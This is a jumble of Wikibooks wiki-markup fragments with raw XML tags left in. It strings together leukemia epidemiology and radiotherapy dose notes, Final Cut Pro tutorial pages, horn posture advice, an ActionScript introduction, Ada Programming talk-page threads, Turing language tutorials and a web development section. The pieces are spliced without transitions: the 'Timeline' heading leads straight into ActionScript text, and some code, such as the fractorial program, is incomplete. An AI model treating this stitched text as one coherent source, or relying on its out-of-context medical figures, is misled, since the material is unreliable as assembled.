*Chronic myeloid leukemia - 0.13 per 100,000 (less than 7% of childhood leukemias)
*Chronic lymphocytic leukemia - rare (about 0.02 per million)
*Others - rare

ALL and AML have the incidence at younger ages (&lt;5 years) then decrease. AML incidence rises after age 10, causing 36% of leukemias at age 15-19, but ALL is still the most common leukemia in the older age group (50%). 

Incidence in Adults: (SEER 1997-2001, age-adjusted)
*Chronic lymphocytic leukemia - 3.53 per 100,000
**increases sharply with age - 0.78 (age 20-54), 7.34 (55-64), 15.1 (65-74), 24.9 (75+)
**median age 60 yo
**higher in males by about 2:1. somewhat higher in whites than blacks.
**5-15% will evolve into a more aggressive lymphoid malignancy
*Acute myeloid leukemia - 3.77 per 100,000
**increases sharply with age - 1.66 (age 20-54), 5.9 (55-64), 13.8 (65-74), 21.7 (75+)
**higher in males by about 2:1. somewhat higher in whites than blacks
*Acute lymphocytic leukemia - 1.5 per 100,000
**incidence increases slightly with age but highest in childhood
**somewhat higher in males than females, whites than blacks
*Chronic myeloid leukemia - 1.6 per 100,000
**increases with age
**higher in males than females (by about 1.5:1). somewhat higher in whites than blacks

*Lymphomatous presentation (PMID 1855175)

'''''Risk groups:'''''
*Low - age 2-9 inclusive, WBC &lt; 10,000; no L2 morphology and boys with plts &lt; 100,000
*Intermediate - all others; includes pts who are low risk but have L2 morphology or boys with plts &lt; 100,000
*High - WBC &gt; 50,000; pts who are intermediate risk but have L2 morphology

'''''Adults with ALL:'''''
*'''High risk:''' age &gt; 35, WBC &gt; 30,000, null cell phenotype, Ph+, remission after more than 4 weeks of intensive chemo
*:Have a 18-28% chance of continuous CR at 5 yrs
*Regular risk
*:60% 5-yr DFS

== CNS disease ==
See also: [[Radiation Oncology/CNS/CSF involvement]]

CNS 1 - Negative cytology (no blasts)
&lt;br&gt;CNS 2 - +cytology, &lt; 5 WBC/microliter
&lt;br&gt;CNS 3 - +cytology, &gt;=5 WBC/microliter, or any CN lesion

*Gilchrist 1994

CNS involvement at diagnosis in 3% of children with ALL.
&lt;br&gt;CNS involvment is more common in ALL, rare in AML (except for the variant acute myelomonocytic leukemia, AMML), and rare in CML and CLL. Risk in AMML is 20%. 5-10% risk in adults with ALL.

==Roles for Radiation==

*CNS prophylaxis
*CNS Therapy (active disease)
*TBI
*Testis prophylaxis(sanctuary sites)
*Palliation
*Treatment of [[Radiation Oncology/Chloroma|chloromas]]

==BMT==

Indications for allogeneic hematopoietic stem cell transplantation (HSCT):
*relapse, unfavorable cytogenetics, induction failure.

High risk patients (relapsed or t(9;22) (Philadelphia) may benefit from BMT

Conditioning regimens prior to HSCT: purpose is to prevent graft rejection and eliminate leukemic cells. Regimen may consist of  chemotherapy alone or chemotherapy + TBI. There is a suggestion of improved outcomes with TBI.

TBI - Socio et al, Blood 2001



==CNS prophylaxis==

Indications:
*CNS involvement at time of diagnosis
*High risk disease
**&lt;1 yo, &gt;10 yo
**WBC &gt; 100,000
**T-cell ALL with WBC &gt; 50,000
**bcr-abl translocation (Philadelphia chromosome)
**lymphomatous presentation

PCI for CNS prophylaxis as frontline treatment for patients with ALL led to an increase in survival in the 1960s. Toxicity from PCI is significant. Earlier trials used 24 Gy. Later trials showed that the dose can be reduced to 12-18 Gy or eliminated entirely if appropriate systemic and intrathecal chemotherapy is used.

==Treatment of CNS disease==
:See also: [[Radiation Oncology/CNS/CSF involvement]]
Therapeutic Cranial Irradiation
-5% of those on initial presentation
-CNS failure

See appropriate protocol for chemotherapy regimen, individual risk-adapted, and response criteria to stratify by risk category.

*Dose
**Varies on protocol
**24 Gy in past, no longer used.
**18 Gy (standard dose) associated with decreased risk of CNS complications

'''''Treatments:'''''
&lt;br&gt;CCG trials from 1971-78 used cranial RT + intrathecal MTX but no spinal RT. 
&lt;br&gt;CSI was found to be more effective than cranial RT in treating pts with CNS relapse. (Willougby, MRC, PMID 816410, 1976)
&lt;br&gt;CCG trials from 1978-83 used 24 Gy cranial + 12 Gy spinal given during consolidation phase along with systemic and intrathecal chemo.
:CNS disease at diagnosis was not an independent prognostic factor, thereby indicating the effectiveness of CNS treatment regimens used.  
CCG trials from 1983-89 used more intensive chemotherapy. Reduced spinal dose to 6 Gy in those treated with intensive consolidation phase in order to limit hematopoietic toxicity.

**Retrospective. 371 patients with leukemia diagnosis, &lt;16 years old, born 1974-1986. Five matched controls from Population Registry of Finland. Information on 9th grade school analyzed
**If cranial irradiation: lower overall marks (mean -0.24 on scale 4-10), and lower marks for all school subjects
**If chemo alone: females &lt;7 at diagnosis had worse school marks

      <text xml:space="preserve">==A Word before We Begin==

This book is intended to be a guide for anybody who wants to learn more about Final Cut Pro.  It is a tutorial, and an alternative to a typical book that one might find on a brick and mortar bookstore shelf for approximately $50.  Ideally, it is part of a series of computer manuals that will increase the technical capabilities of individuals interested in all forms of electronic and computer media.

Anybody is welcome to add their thoughts to this book. Newbies, amateurs, and professionals all have content that will help flesh this book out and make it complete.

A [[w:wikibook|wikibook]] is a community project.  This is a book that requires a substantial amount of time and energy to complete.  It can benefit greatly from even modest contributions from readers and editors. For example, even as a reader, you can fix bugs and typos in the text in order to improve the book. If you find an opportunity to make a correction or improvement, simply click &quot;edit,&quot; make your changes, and click save. Other users, especially those who have devoted large amounts of energy and time to this book and the wiki world in general, will eventually review your changes and confirm their appropriateness.

If you are unsure of how you can help, you can visit the &quot;discussion&quot; page and ask there. In general, to make a small change, you don't need to ask first, and you can just use common sense to determine if your change is appropriate.  We trust your judgment.

A large portion of this book will eventually utilize screen captures.  As you contribute, please don't let your lack of screen captures deter you from contributing portions of text that would benefit from eventual images.

==History==
Please see the wikipedia entry for [[w:Final Cut Pro|Final Cut Pro]] for a short history of Final Cut Pro and how the software came to be.

==Linear Editing==

In the early days of film, editors literally made cuts in film when performing an edit.  They would then tape or splice another segment of film onto the cut.  Film editing was originally non-linear, an editor could place any amount of film in between any two frames and it would still be playable.  When editing moved to video, the process became linear.  One could only edit in one direction in the timeline.  The editor would start with a clip, then add a second clip to the end of the first clip, then add another to the end and so on until the video was completed.  If the editor wanted later to add a clip between the second and third clips, for instance, he would have to record everything again after the newly inserted clip, for this clip would be over the original editing. 


Just think about using a typewriter (if you remember those) instead of a text-editing software:  You should either retype the whole page again or erase the third and subsequent paragraphs, insert the new one, and then rewrite everything from the third paragraph on.  A typewriter would be a &quot;linear&quot; writing machine where any computer with a text editing software (where you can cut, copy, paste, edit your text easily) would be &quot;non-linear&quot;.


Now, the non-linear process is available to video as well as film.

==Format==

This book will begin by focusing on the DV (miniDV and DVCAM) format, as it is the most common format used by Final Cut Pro users.  The firewire 400 cable that connects a DV deck or DV camera to an Apple computer enables users to edit without any additional hardware.  Eventually, we will compose additional chapters or supplements to chapters that will encompass additional formats.

Correct '''posture''' is important to comfortably producing a good tone on the horn, as with any wind instrument. Using a poor posture can result in wavering pitch, inadequate air support, pinched or hollow sound, and various other playing difficulties.

While playing, the player's back and neck must always be in line. It is recommended that hornists (and most wind instrumentalists) sit with their backs off the back of the chair and feet flat on the floor for a slight &quot;leaning forward&quot; feeling. The most important thing to remember is that the posture must be as upright as possible without causing any excess tension; the entire body must be as relaxed as possible to avoid tension creeping into the sound.

Only the tips of the fingers should be placed on the valve levers.  This allows for faster depression of valves, allowing the player to change pitches properly.

Correct posture will allow one to adjust dynamics more correctly and produce a better sound.

      <comment>I removed 'so called' and 'whereupon' to better focus the idea and added 'is displayed' at the end of that sentence. When my software comes in the mail I'll try to start adding some pages from a beginner POV! /* Canvas */</comment>
      <text xml:space="preserve">Final Cut Pro's standard view consists of four main windows: the ''browser'' (in the top-left corner by default), the ''viewer'' (in the top middle, by default), the ''canvas'' (top right, by default) and the ''timeline'' (at the bottom).

==The Browser==
As in most digital non-linear editing applications, the Browser is not an interface to the computer's [[filesystem]]. It is an entirely virtual space in which references to clips (aliases) are placed, for easy access, and arranged in folders called 'bins'. Since they are only references to clips that ''are'' on the media drive of the computer, moving or deleting a source file on the media hard drive destroys the link between the entry in the Browser and the actual media. This results in a 'media offline' situation, and the media must be 'reconnected'. Final Cut Pro can search for the media itself, or the user can do this manually. If multiple clips are offline at the same time, Final Cut can reconnect all the offline media clips that are in the relative directory path as the first offline media clips that is reconnected.

The Browser contains two type of tabs, one for projects and one for effects.  They both behave like an explorer window. The projects tab will show the various bins, media, clips, and sequences that you have imported into Final Cut, along with any associated information.  Column headings are very versatile and able to be rearranged.  By clicking and dragging, you can move entire column headings around. 

You can also have multiple projects open at once.  Every project will open under a separate tab.  By clicking and dragging the project tab outside of the browser window, you can make the tab independent of the browser.  This is useful for sharing media between multiple projects.  

The Effects tab is the other available tab in the Browser window.  Take a look and orient yourself with the various filters and transitions available in the sub folders.  In order to use each effect, you can simply click and drag the filters to media in the Timeline.

==Viewer==
The viewer has tabs for each channel of the selected clip's audio, in which the waveform for the audio can be viewed and scrubbed, and where its volume can be keyframed. The filters tab is where effects for the clip appear and where their parameters can be adjusted and keyframed. If the clip selected is a generator (such as an oval shape), a control tab appears for changing its geometrical properties. Finally, the viewer's motion tab contains tools to adjust the scale, opacity, [[w:cropping (image)|cropping]], rotation, distortion, [[w:drop shadow]], [[w:motion blur]] and time remapping properties of the clip. Mini-timelines to the right of each parameter allow the property to be keyframed.

==Canvas==
The canvas outputs the contents of the Timeline. To add clips to the Timeline, besides dragging them there, it is possible to drag clips from the Browser or Viewer onto the Canvas, where the 'edit overlay' is displayed. The edit overlay has seven drop zones, into which clips can be dragged in order to perform different edits. The default is the 'overwrite' edit, which overwrites at an in point or the space occupied after the playhead with the incoming clip. The 'insert' edit slots a clip into the sequence at the in point or playhead's position, keeping the rest of the video intact, but moving it all aside so that the new clip fits. There are also drop zones to have the application automatically insert transitions. The 'replace' edit replaces a clip in the Timeline with an incoming clip, and the 'fit to fill' edit does the same thing, but at the same time, it adjusts the playback speed of the incoming clip so that all of it will fit into the required space [in the Timeline]. Finally there is the 'superimpose' edit, which automatically places the dropped clip on the track above the clip in the Timeline, with a duration equal to the clip below it. Unless an in or out point are set, all edits occur from the position of the playhead in the Timeline.

Using the wireframe view on the canvas, the clip can be manipulated directly - dragging it around in the canvas to change its position, for example, or resizing it. Precise adjustment controls for these things are in the viewer.

==The Timeline==

ActionScript is a scripting language developed by [http://www.adobe.com Adobe] (formerly [http://www.macromedia.com Macromedia]) for its Flash animation studio. ActionScript is similar to JavaScript with its syntax and functionality. The latest version, ActionScript 3.0, released together with Flash CS3, emphasizes [[Object Oriented Programming|Object oriented programming]] more so than previous versions. ActionScript is a proprietary language designed to control animations and create advanced interactive applications such as slide-shows, games, quizzes, tutorials, and websites. ActionScript 3.0 has grown substantial capabilities in comparison with previous versions. ActionScript may be difficult to learn for beginners with no programming experiencing, however, it becomes easier to grasp with repeated practice and use.

This tutorial is designed for use with Actionscript 2.0.  Changes for ActionScript 3.0 will be listed as well.

      <text xml:space="preserve">Thank you very much for your contribution to the introduction to the course on the history of Ancient Philosophy. I feel that it is in fact a very good starting point. I like the way you mention the fact that we do not usually pay enough attention to eastern philosophy in the west.&lt;br /&gt;I have written a small article on the history of Japanese philosophy, and I will include it shortly. I hope we receive some contributions on the history of Chinese and Indian philosophy. This could hopefully give readers an overview of a philosophical tradition that has been greatly neglected in the west.([[User:Alex beta|Alex beta]] 10:37, 7 Mar 2005 (UTC))</text>

      <text xml:space="preserve">== New Character Set ==

* IMHO it should be better (more understandable) to use an English word to show the use of 32 bits identifiers. The identifier &lt;tt&gt;Übertrag&lt;/tt&gt; is not very useful for non german speakers. Something like ''Déjà vu'', but that sounds like a common name for an identifier. Or maybe the example could simply be the definition of constant Pi in &lt;tt&gt;Ada.Numerics&lt;/tt&gt;  
-- [[User:Suruena|suruena]] 11:54, 7 Mar 2005 (UTC)


* As far as I know these two examples are already possible in Ada 95, since [[w:Latin-1|ISO Latin-1]] has to be supported in identifiers. Will be &amp;euro; supported? That would be a good example:
 type Price_In_&amp;euro; is delta 0.01 digits 8;
-- [[User:ManuelGR|ManuelGR]] 20:46, 8 Mar 2005 (UTC)


* It's true, both ''Übertrag'' and ''Déjà vu'' are allowed in Ada 95, so we must change that example. I don't known whether ''Price_In_&amp;euro;'' is a legal Ada 2005 identifier (''Price_In_$'' is not), but at least it is not rejected by GCC 3.4.3 (using switches &lt;tt&gt;-gnatiw -gnatW8&lt;/tt&gt; for [[w:UTF-8|UTF-8]] character set). Anyway, until we are sure the euro sign is valid in identifiers I would use another example, like putting the standard constant Pi and saying that russians and indians will be able to use their mother tonge in Ada.
-- [[User:Suruena|suruena]] 14:47, 13 Mar 2005 (UTC)

== Ada 200Y ==

As stated in the [http://www.adaic.com/standards/articles/ada06-faq.html Ada 2006 FAQ], the &quot;nickname&quot; of the next revision of Ada isn't clear yet (the community decides this name, and there is no agreement). The new standard probably will be accepted in early 2006, however some voices are saying that the name should be Ada 2005 because it has been named that way during some time, and because ''Ada 2006'' do not sounds well. I don't have any preferences, but IMHO maybe we should put every reference to the next revision simply as &quot;Ada 200Y&quot;, explaining in this page that the nickname isn't decided yet. --[[User:Suruena|surueña]] 11:23, 2005 Jun 5 (UTC)

:For new content, I agree in using Ada 200Y. For the current content I suggest to wait how it evolves before changing anything. [[User:ManuelGR|ManuelGR]] 19:46, 5 Jun 2005 (UTC)

According to the &quot;Rationale for Ada 2005&quot; published in [http://www.adacore.com/ada_2005.php http://www.adacore.com/ada_2005.php] (right box):

:''This is currently being reviewed and the final approved standard should emerge in the first half of 2006. There has been much discussion on whether the language should be called Ada 2005 or Ada 2006. For various reasons the WG9 meeting in York in June 2005 decided that the vernacular name should be Ada 2005.''

So we should not take the contrary to the WG9. Now it is clear that the standard will be published in 2006 but the language will preserve its currently popular name. I will undo my changes, so all the references go back to Ada 2005. [[User:ManuelGR|ManuelGR]] 19:14, 14 July 2005 (UTC)

== contents structure, library ==

The nesting level of Library seems broken.
I feel guilty of that. Could someone in the know
have a look, and get things right again?

The programs' sources could be compiled but they aren't on
sf. I'm not yet familiar with how one arranges that.
I could send a .tar if anyone wants it.

[[User:GeorgBauhaus|gb]]

:The nesting level is now fixed, I have removed a minor section title because there was too much nesting. About Sourceforge, you can become a member of the [https://sourceforge.net/projects/wikibook-ada/ project] and then you can upload all the sources you want, otherwise you can send to me the examples (using the &quot;E-mail this user&quot; link on my userpage [[User:ManuelGR|ManuelGR]]) and I will upload them to the CVS. [[User:ManuelGR|ManuelGR]] 16:17, 23 October 2005 (UTC)

== bean counting algorithm ==

actually, the introductory paragraph at the start of the bean counting
subjection states an exercise that is more extensive than its semi-solution.
It's a WiKi, o.K.? :-)

[[User:GeorgBauhaus|gb]]

:this is now fixed. [[User:GeorgBauhaus|gb]] 02:55, 1 November 2005 (UTC)

== Container Lib ==

Well, while a description of the container lib was in desperate need I think it would better be placed in either in the Library section ot the book [[Ada_Programming/Libraries/Ada.Containers]], [[Ada_Programming/Libraries/Ada.Containers.Vectors]] or inside a new feature page [[Ada_Programming/Containers]].

This is the &quot;overview&quot; page and the text is allready detailed for &quot;overview&quot;. Nothing wrong with detailed - it deserves it't own space

--[[User:Krischik|Krischik]]&amp;nbsp;&lt;sup&gt;[[User_talk:Krischik|T]]&lt;/sup&gt; 12:15, 3 November 2005 (UTC)

:I think so, it deserves its own space. Let's wait to hear what Georg Bauhaus thinks about it. [[User:ManuelGR|ManuelGR]] 19:40, 4 November 2005 (UTC)

::I agree. [[User:GeorgBauhaus|gb]] 18:31, 5 November 2005 (UTC)

Given that we all agree, I will copy the content to [[Ada_Programming/Containers]]. I think that one is the best page since the demo covers more than one container (so not for [[Ada_Programming/Libraries/Ada.Containers.Vectors]], [[Ada_Programming/Libraries/Ada.Containers.Maps]], etc) and it is more tutorial-oriented than reference-oriented, so not for the parent package [[Ada_Programming/Libraries/Ada.Containers]] either. Containers will be a main topic for Ada 2005 tutorials, won't they? [[User:ManuelGR|ManuelGR]] 22:46, 22 November 2005 (UTC)</text>

#Open Final Cut Pro.
#Click on FILE &gt; Save Project As
#Give your project a name.  We’ll name ours “First Project,” and we’ll save it under the Documents folder of the current user.


Final Cut Pro has an auto save feature that will prompt you to save your project if you haven’t already.  It can't perform an autosave unless the project has been saved at least once first.


When you open Final Cut Pro for the first time, you will encounter the Easy Setup Window, and you will be asked to choose a scratch disk.  For now, select DV NTSC for the Easy Setup, and set your scratch disk to an external hard drive or second hard drive.  If you don’t have an external or second hard drive, you can use your main/internal hard drive to edit your project.  Storing media on the main hard drive is not ideal; if you eventually fill up your hard drive, you can affect system performance, but it can be done.

      <text xml:space="preserve">There are two menus that are important to look at before you begin importing video and editing in the timeline: the ''User Preferences'' and the ''System Settings.''

First let's take a look at the ''User Preferences:''

Go to '''FINAL CUT PRO &gt; User Preferences'''

==User Preferences==
There are five tabs under the ''User Preferences'' control panel.
===General===
====Levels of Undo====
This can be set from 0 to 99.  The default is 10.  I generally prefer more than ten, but I also don’t need 99 levels of undo.  The higher the number you pick, the more memory you are devoting to saving your history of edits.  For now, set the ''Levels of Undo'' to 30
====List Recent Clips====
The list of recent clips pop up menu is located on the lower right corner of The Viewer window.  You can set this to be as high as 20, but the default of 10 clips is usually fine.
====Multi-Frame Trim Size====
This number determines how many frames forward or backward the trim buttons work in Trim Mode. Along with the multi frame button in Trim Mode, there will always be a +1 and -1 trim button, so feel free to try different number you feel might suit you.  You can set this to be as high as 99.  Try 10 to start.
====Real Time Audio Mixing====
The number of tracks that can be mixed and that you can listen to in real time is dependent on your processor speed, the number of audio filters used in your sequence, your hard disk data transfer rate, and the amount of memory allocated to Final Cut Pro.  This number can be set up to 99; its default is 8.  Typically eight is enough to begin projects with, although if you add a lot of sound effect tracks and music tracks, you may want to bump this number up to 10 or 12.  It is a handy adjustment to have available, but generally 8 is enough.
====Audio Playback Quality====
Unless you are performing a detailed audio mix at the end of your editing process, set this to ''low'' to enable you to hear the greatest number of mixed tracks and audio filters in real time.  When you are recording your sequence to tape, Final Cut Pro uses the high setting regardless of what you have selected for the playback quality.

      <text xml:space="preserve">Loops are things that keep on repeating and repeating until you tell it to stop.  There are two types of loops that we'll be learning: for-loops and regular loops.

For-loops increase the value of an integer ''i'' (or anything else) by a given amount (default: 1), until it has reached its upper limit.

&lt;pre&gt;
for i : 1 .. 10 %Start with 1, end with 10, increase i by 1 (i.e. 1,2,3...10)
     put i
end for
&lt;/pre&gt;

That's all there is to it! Whatever's in the middle will be executed each time the loop is run.  This program will print all numbers from 1 to 10.

Now there are a few things you may have noticed.  Firstly, we haven't declared i.  Actually, you're not supposed to declare for-loop variables.  In fact, if you do, then it won't work!

What if we want to print all multiples of 5 between 1 and 103?

&lt;pre&gt;
for i : 0 .. 103 by 5
    put i
end for
&lt;/pre&gt;

Excellent! You're now a for-loop guru! Loops are pretty simple, and the syntax is almost the same.  So why would you want to use normal loops instead of for-loops? For-loops are used when you know how many times to repeat it.  However, sometimes the amount of times you repeat depends on how many lines there are in a text file.  More often, you'll want a program to loop until the user tells you to exit.  This is what we'll be doing.

&lt;pre&gt;
var word : string

loop
     put &quot;Enter any word you want, and I'll tell you what it is! (type 'exit' to exit)&quot;
     get word
     exit when word = &quot;exit&quot;

     put &quot;You entered &quot;, word
end loop
&lt;/pre&gt;

That's pretty self explanatory.  We're getting a string from the user, and if the string is exit, then we exit.  Turing is a very easy program to use, and it avoids complicated syntax, which becomes handy in cases like this; 'exit when' means exactly that, you exit when the following case is true.

      <text xml:space="preserve">What are datafiles? Why would you need them?

Data files are simple text files that Turing can read and write from.  Sometimes, especially in contests, the data entered will be in a text file rather than the user entering it when they run the program.  In this tutorial, you will learn how to read from and write to data files.

Let's start with reading, which is used more often.  You first declare an integer variable.  This is required from Turing.  Then, you'll use the &lt;code&gt;open&lt;/code&gt; and &lt;code&gt;get&lt;/code&gt; statements to read from it.

&lt;pre&gt;
var inp : int %Turing requires this integer variable
var ctr : int := 0 %Counter variable, initial value 0
var tmp : string %Holds each line of the datafile

open : inp, &quot;INPUT.txt&quot;, get %open the file INPUT.txt for reading

loop
     exit when eof(inp) %Exit when the end-of-file is reached
     ctr += 1
     
     get : inp, tmp %Read the [ctr]th line from the data file, and store it in the string variable tmp
     put ctr, &quot;th line reads: &quot;, tmp
end loop
&lt;/pre&gt;

You may have noticed &lt;code&gt;eof&lt;/code&gt; in the above code.  EOF means end-of-file, so we're telling Turing to exit the loop once it has reached the end of the file.  If you don't do this, you'll get an error because Turing will try and read past the end of the file!

&lt;td style=&quot;vertical-align: top;&quot;&gt;'''[[Web Development/The rationale of concepts: being careful|Previous]] — Section 3.1 — [[Web_Development|Contents]] — [[Web Development/Setting up a reasonable web development budget|Next]]'''&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;/div&gt;

This section means to serve as an introduction to the rest of Section 3: '''Resources'''.

==== The Simple Website ====

&lt;table WIDTH=&quot;300&quot; align=&quot;right&quot;&gt;&lt;tr&gt;&lt;td style=&quot;background-color: #CCFFCC; border: solid 1px #99CC99; padding: 1em;&quot; valign=top&gt;''Four basic things are needed for a website: '''domain name, webhost, text editor, and an ftp program'''. This will get you a basic website without pictures or any complex backend, but it is functual and can be effective all the same.''
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;Web development is fairly easy to learn and get into. This is mainly because it is so accessible, and because a simple website requires very little overhead or experience to create. To create a simple website, one will need to have the following:

# '''Domain Name''' - the common place the user will find your site on the World Wide Web. For example, www.yournamehere.com is a domain name. You can purchase your own domain or get a free one offered by many different online companies. Domains have come down in price drastically over recent years, and can now be found for under $10 USD.
# '''Webhost''' - this is a company that will &quot;host&quot; your domain and web pages. By &quot;uploading&quot; your &quot;data&quot;&amp;mdash;transferring the files that makeup your website&amp;mdash;to their server, you give the consumer access to your page on the Internet.
# '''Text Editor program''' and a little knowledge of '''HTML''' - HTML, or Hypert-text markup language is the most basic of the web-languages. All you really need to develop a web page is some basic knowledge of HTML and the Windows program Notepad (the Macintosh equivalent is TextEdit). A page written in this &quot;markup language&quot; can contain images, links, text formatting, etc., and its file extension is .html. After you type your page into one of these free programs (or many other pay programs), upload the file to your hosting. A user's browser will then be able to decipher the HTML.
# '''FTP Program''' - FTP stands for file transfer protocol, and is the most common method of uploading your files to your hosting. When you register a domain name and secure space online for your data, your webhost will give you an FTP user name and password. By typing these into one of the numerous [http://www.google.com/search?hl=en&amp;lr=&amp;q=free+ftp+program&amp;btnG=Search free FTP programs], you can access your web space and upload your website.

&lt;table WIDTH=&quot;300&quot; align=&quot;right&quot;&gt;&lt;tr&gt;&lt;td style=&quot;background-color: #FFCCCC; border: solid 1px #FF9999; padding: 1em;&quot; valign=top&gt;'''HTML''' – Hyper Text Markup Language, the most common web language, and also the simplest and easiest to learn.
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

'''''Note''': HTML is not covered in this course, but several [[web Design/Basic HTML and CSS| HTML tutorials]] can be found online.''

==== Human Resources ====

As for the more advanced websites, a staff is usually required to maintain and keep up the site. Aside from knowledge of HTML and webspace, people may be required to do miscellaneous jobs such as graphic design, advanced coding, customer relations, network administration, etc.

==== Capital ====

Capital, varying with the complexity of the website's goals, is also needed. For a simple website run by one person, the expenses may be as small as paying for the domain and yearly hosting fees. As websites get more complex and intricate, the amount of capital increases proportionally. 

As a common sense rule, the bigger the website you want, the more people, money, and technology you're going to need. This section should serve as a guide for planning resource gathering and management, and to give you an idea of what's needed to start up and maintain a website.

==Question 1: Fractorials==
A '''fractorial''' is very similar to a factorial.  A fractorial of a n means that 1 to n over that number is a whole number.

For example, 5 fractorial is 60, because 1/60 + 2/60 + 3/60 + 4/60 + 5/60 is a whole number.

Write a program that will find the fractorial of any given number.  It should ideally get input from a data file.  Sample input will be given, and your program should not take over 2 minutes per result.

var n : int          %User input
var ctr : int := 0   %Counter variable
var gotit : boolean  %Stores if fractorial is found

get n

loop
    ctr := 0  %ctr is NEVER actually used as zero, since that would cause a division by 0 error.

    loop
        gotit := true      %Initially assume that fractorial has been found, and change to false if found otherwise
        ctr += n           %Increase counter by n
        for i : 1 .. n     %Try n/1, n/2, n/3... until n/i.  If all are whole numbers, then answer has been found
            if ctr / i not= ctr div i then
                gotit := false
            end if
        end for
        exit when gotit = true
    end loop

    if gotit = true then
        put &quot;Fractorial (&quot;, n, &quot;) = &quot;, ctr
        exit
    end if
end loop
&lt;/pre&gt;

While you might try ctr += 1 initially, it will quickly become evident that this is too slow.  Through logical reasoning and some experimentation, you should be able to discover that the fractorial of n is a multiple of n.

      <text xml:space="preserve">Both computer programmers and mathematicians have quickly learned that with complicated problems, it can become near impossible to try and solve everything at the same time.  Instead, we try to reduce the problem that we know how to solve.  This can be done easily and efficiently with procedures and functions.

First, let's deal with procedures.  When you call a procedure inside a program, it jumps to that procedures, executes the code, and goes back.

''Sample procedure code coming soon''

----
You can think of functions like variables that calculate things.  They return a value when you call them, so they can be used just like variables.  This code should help you understand:

Here is a program that will print a string backwards.

&lt;pre&gt;
function flipWord (w : string) : string
    var tmp : string := &quot;&quot;

    for decreasing i : length (w) .. 1
        tmp := tmp + w (i)
    end for
    result tmp
end flipWord

%%%%%%%%%%MAIN PROGRAM%%%%%%%%%%
var word : string

put &quot;Enter word&quot;
get word : *   %bypasses token-oriented input

put flipWord (word)
&lt;/pre&gt;

There are actually a couple new things.  First, the more simple, is the word &lt;code&gt;decreasing&lt;/code&gt; in the for-loop.  This tells Turing to decrease by one.  As you can see, functions allow us to keep our main program nice and neat.  It will become imperative to use functions in larger programs, as they can get very complicated!

If you were wondering what 'token-oriented input' meant, it's just telling Turing NOT to consider space to mean that the next variable is being put in.  This allows spaces in the word variable.

----
Processes are like procedures, except they can run concurrently with other parts of your code.  This means that, if you're using a loop, your process won't stop you from doing whatever else you need.  This is especially useful in cases like playing music, where you need other code to be able to run while the music is playing.

Processes are used similarly to procedures; however, one must replace the word &lt;code&gt;procedure&lt;/code&gt; with &lt;code&gt;process&lt;/code&gt;.  Additionally, processes cannot be started by simply calling them.  You must prefix the process name with the command &lt;code&gt;fork&lt;/code&gt;.

      <text xml:space="preserve">If statements are just that.  They say, &quot;'''If''' a is true, then do the following, if not, do this instead&quot;

Here's a simple program for you that tests if someone is an adult.

&lt;pre&gt;
var age : nat %Can't have negative age

get age

if age &lt; 18 then
     put &quot;You are not an adult!&quot;
else
     put &quot;You are an adult!&quot;
end if
&lt;/pre&gt;

This program is saying: &quot;Ask the user for their age.  If it's under 18, then they're not an adult.  If it's '''not''' under 18, then they are.  Note that else statements do not check if they are greater/equal to 18, they just check if they are not under 18.  This will suffice for our purposes

But what if we want to test for seniors too? This can be accomplished with an &lt;code&gt;elsif&lt;/code&gt; statement:

&lt;pre&gt;
...
if age &lt; 18 then
     put &quot;You are not an adult!&quot;
elsif age &gt; 64 then
     put &quot;You are a senior!&quot;
else
     put &quot;You are an adult!&quot;
end if
&lt;/pre&gt;

This is saying &quot;If they are under 18, they're not an adult.  If they're not under 18, then check if they're older than 64; if so, they are a senior.  If neither of the above cases are true, then they are an adult.

Cases are like funny if-statements.  They're pretty easy to understand, but you probably won't use them until later.  Still, they fall under the same category as if statements, so you might as well get used to them now.

== In what situations does Turing really work great ? ==

* In what situations does Turing really work great ? When would I choose Turing over some other language on the [[Wikibooks:Programming languages bookshelf]] such as [[QBasic|Programming:QBasic]] or [[Prolog|Programming:Prolog]] or [[Python Programming]] ?
* Who uses Turing ?
* Are there any major programs written in Turing ?
* Can Turing run on my PC ?
* Can Turing run on my [[Embedded Systems/PIC ?
* How do I install the Turing compiler/interpreter/IDE on my computer ?

i0 := --[[User:DavidCary|DavidCary]] 00:20, 4 October 2005 (UTC)

:* Hi David.  Sorry for the late response.  Turing is used primarily as a learning tool, and was designed as such.  Since it was made for ease-of-use rather than speed or versatility, the only reason you might use Turing is for a simple program, or if you're just getting started with programming.
:* Mostly highschool students
:* To my knowledge, no.
:* Yes, turing runs on windows.  It also runs on linux and  mac.
:* If you can get linux on it ;)
:* Not that I know of, but I'm not sure.
:* You'll have to buy a copy from [http://www.holtsoft.com/turing/ holtsoft].  If you are a student, and your school/board has purchased a license, you can get a copy for free.
:* Under windows, installation is very simple.  I don't use it that often and I haven't used it in a while, so I'm not sure if there are any important notes for installing it on other systems.

== passing parameters ==

why is not passing parameters bad programming style? If it works without passing parameters, why not use global variables?
:The reasons may vary depending on the program.  One of the most common reasons is that your procedures/functions may ultimately be included in a library, where people using your programs will want to just pass the parameters straight to it rather than figuring out all the variable needed. -[[User:Frazzydee|Frazzydee]]|[[User talk:Frazzydee|&amp;#9997;]] 04:23, 24 May 2005 (UTC)

== increasing and decreasing a counter by an increasing and decreasing amount?? ==

So i need to increase a value by zero, then one, then -1, 2, -2, 3, -3... and i have no idea on how to do it. i've been trying to use some variation on

&lt;pre&gt;
  loop
    counter:=counter+1
    a:=a+(-1)**counter
  end loop
&lt;/pre&gt;
but its just doing a+0 ,a-1, a+1, a-1, a+1 insdead of a+0, a-1,a+1,a-2,a+2 
HELP!

:I'm not sure I completely understand your question...wouldn't that end up just equalling 0 if you're subtracting and then adding by the same number? -[[User:Frazzydee|Frazzydee]]|[[User talk:Frazzydee|&amp;#9997;]] 11:58, 24 May 2005 (UTC)

It's going a+0 ,a-1, a+1, a-1, a+1 because -1**1=-1, -1**2=+1, -1**3=-1, -1**4=+1...etc.
Try:
&lt;pre&gt;
var y : int
var z : int
for x:1..10
    y:=x
    z:=x
    put &quot;a+&quot;, y 
    put &quot;a-&quot;, z
end for
&lt;/pre&gt;

== Slowing Down Your Program ==

How can I slow down the rate at which my program outputs(put) information to the screen?
Please help! Urgent!

''Answer:''
:Use '''delay(n)''', where n is the number of milliseconds you want the program to pause for.  Example: 

 delay(1000)

will make the program pause for 1 second before executing the next line. -[[User:Frazzydee|Frazzydee]]|[[User talk:Frazzydee|&amp;#9997;]] 22:53, 6 Jun 2005 (UTC)

